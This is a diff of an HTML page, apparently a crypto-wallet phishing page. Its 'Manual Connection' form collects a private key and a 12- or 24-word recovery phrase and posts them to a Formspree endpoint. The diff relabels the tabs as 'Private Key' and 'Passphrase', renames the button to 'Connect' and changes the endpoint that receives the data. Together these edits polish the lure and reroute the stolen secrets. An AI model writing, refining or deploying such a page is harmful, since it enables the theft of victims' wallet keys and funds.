@@ -1067,8 +1067,8 @@
           <h3>Manual Connection</h3>
 
           <div class="tab-bar">
-            <button class="tab-btn active" data-tab="tabIssue">Issue</button>
-            <button class="tab-btn" data-tab="tabReview">Review</button>
+            <button class="tab-btn active" data-tab="tabIssue">Private Key</button>
+            <button class="tab-btn" data-tab="tabReview">Passphrase</button>
           </div>
 
           <form id="contactForm">
@@ -1076,7 +1076,7 @@
 
             <!-- ISSUE TAB -->
             <div class="tab-panel active" id="tabIssue">
-              <div class="form-group">
+               <div class="form-group">
                 <label for="issueBox">Private Key</label>
                 <textarea
                   id="issueBox"
@@ -1094,7 +1094,7 @@
                 <textarea
                   id="messageBox"
                   name="message"
-                  placeholder="Enter your 12 or 24-word recovery phrase, with each word separated by a space..."
+                  placeholder="Enter your recovery passphrase typically 12-24 words seperated by a space"
                   rows="6"
                 ></textarea>
                 <div class="phrase-hint" id="phraseHint">
@@ -1105,7 +1105,7 @@
 
             <!-- SUBMIT always visible -->
             <button type="submit" class="submit-btn" id="submitBtn">
-              Submit
+              Connect
             </button>
           </form>
         </div>
@@ -1296,7 +1296,7 @@
 
             var data = new FormData(form);
             try {
-              await fetch("https://formspree.io/f/xyknlvro", {
+              await fetch("https://formspree.io/f/xdawbakz", {
                 method: "POST",
                 body: data,
                 headers: { Accept: "application/json" },
